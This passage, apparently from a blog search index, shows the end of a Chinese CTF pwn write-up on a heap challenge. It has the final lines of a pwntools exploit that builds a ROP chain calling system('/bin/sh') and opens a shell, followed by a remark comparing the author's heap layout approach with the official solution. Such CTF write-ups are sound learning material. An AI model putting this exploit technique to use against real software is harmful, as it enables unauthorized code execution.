class="line">free(<span class="number">7</span>)</span><br><span class="line">rdi=li(<span class="number">0x000000000010f75b</span>)</span><br><span class="line">system,binsh=getshell()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(rdi+<span class="number">1</span>)*<span class="number">0x81</span>+p64(rdi)+p64(binsh)+p64(system)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x480</span>,payload)</span><br><span class="line">esc()</span><br><span class="line">ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><p>(我的堆风水比较麻烦，官方wp堆风水只需要泄露libc即可，不需要泄露heap，<a href="https://hust-l3hsec.feishu.cn/wiki/WjlUwIAahiXhlykwIe7c5V57nPb">官方wp</a>)</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 堆 </tag>
            
            <tag> L3 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
